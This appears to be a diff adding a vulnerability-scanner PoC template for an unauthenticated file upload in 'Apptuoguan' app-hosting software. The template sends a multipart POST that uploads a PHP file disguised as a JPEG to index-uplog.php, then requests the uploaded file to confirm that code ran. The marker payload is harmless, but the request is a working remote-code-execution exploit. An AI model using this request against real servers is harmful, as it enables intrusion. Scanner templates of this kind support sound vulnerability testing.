@@ -1,0 +1,37 @@
+name: poc-yaml-Apptuoguan-index-uplog-File-upload
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /source/pack/upload/2upload/index-uplog.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy
+      body: "\
+        ------WebKitFormBoundary03rNBzFMIytvpWhy\r\n\
+        Content-Disposition: form-data; name=\"time\"\r\n\
+        \r\n\
+        1-2\r\n\
+        ------WebKitFormBoundary03rNBzFMIytvpWhy\r\n\
+        Content-Disposition: form-data; name=\"app\"; filename=\"1.php\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <?php print(111*222);unlink(__FILE__);?>\r\n\
+        ------WebKitFormBoundary03rNBzFMIytvpWhy--\r\n\
+        "
+    expression: response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /source/data/tmp/1-2.php
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139972168
+
